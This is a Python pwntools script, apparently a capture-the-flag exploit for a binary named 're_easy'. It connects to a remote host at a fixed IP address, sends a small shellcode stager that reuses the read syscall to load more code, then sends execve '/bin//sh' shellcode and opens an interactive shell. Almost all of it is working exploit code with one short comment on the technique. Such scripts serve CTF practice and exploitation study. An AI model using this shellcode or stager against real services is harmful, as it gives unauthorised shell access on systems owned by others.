from pwn import *

r = process('./re_easy')
r = remote('13.112.180.65', 8361)
#r = remote('127.0.0.1', 8333)
context.arch = 'amd64'


###
#   The key point is that:
#   syscall `read` will set rcx to be rip
###
payload = asm("""
l:  syscall
    mov dl, 0x40
    push rcx
    pop rsi
    jmp l
""")

r.send(payload)

payload = asm("""
    xor rax, rax
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
""")

r.send(payload)


r.interactive()
